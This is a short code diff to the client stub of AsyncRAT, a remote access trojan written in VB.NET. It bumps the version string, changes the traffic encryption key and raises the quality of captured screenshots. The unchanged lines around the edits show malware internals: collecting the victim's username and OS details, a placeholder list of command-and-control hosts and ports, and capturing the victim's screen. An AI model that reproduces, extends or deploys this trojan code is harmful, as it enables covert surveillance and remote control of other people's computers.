@@ -98,7 +98,7 @@ Namespace Stub
         Private Shared Function Info()
 
             Dim OS As New Devices.ComputerInfo
-            Return String.Concat("INFO", SPL, GetHash(ID), SPL, Environment.UserName, SPL, OS.OSFullName.Replace("Microsoft", Nothing), Environment.OSVersion.ServicePack.Replace("Service Pack", "SP") + " ", Environment.Is64BitOperatingSystem.ToString.Replace("False", "32bit").Replace("True", "64bit"), SPL, "AsyncRAT v1.0")
+            Return String.Concat("INFO", SPL, GetHash(ID), SPL, Environment.UserName, SPL, OS.OSFullName.Replace("Microsoft", Nothing), Environment.OSVersion.ServicePack.Replace("Service Pack", "SP") + " ", Environment.Is64BitOperatingSystem.ToString.Replace("False", "32bit").Replace("True", "64bit"), SPL, "AsyncRAT v1.0B")
 
         End Function
 
@@ -234,7 +234,7 @@ Namespace Stub
         Public Shared ReadOnly Hosts As New Collections.Generic.List(Of String)({"%HOSTS%"})
         Public Shared ReadOnly Ports As New Collections.Generic.List(Of Integer)({123456})
         Public Shared ReadOnly SPL As String = "<NYANxCAT>"
-        Public Shared ReadOnly KEY As String = "<1234>"
+        Public Shared ReadOnly KEY As String = "<AsyncRAT>"
     End Class
 
 
@@ -418,7 +418,7 @@ Namespace Stub
                 g2.CompositingQuality = CompositingQuality.HighSpeed
                 g2.DrawImage(B, New Rectangle(0, 0, W, H), New Rectangle(0, 0, Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), GraphicsUnit.Pixel)
 
-                Dim encoderParameter As EncoderParameter = New EncoderParameter(Encoder.Quality, 40)
+                Dim encoderParameter As EncoderParameter = New EncoderParameter(Encoder.Quality, 50)
                 Dim encoderInfo As ImageCodecInfo = GetEncoderInfo(ImageFormat.Jpeg)
                 Dim encoderParameters As EncoderParameters = New EncoderParameters(1)
                 encoderParameters.Param(0) = encoderParameter
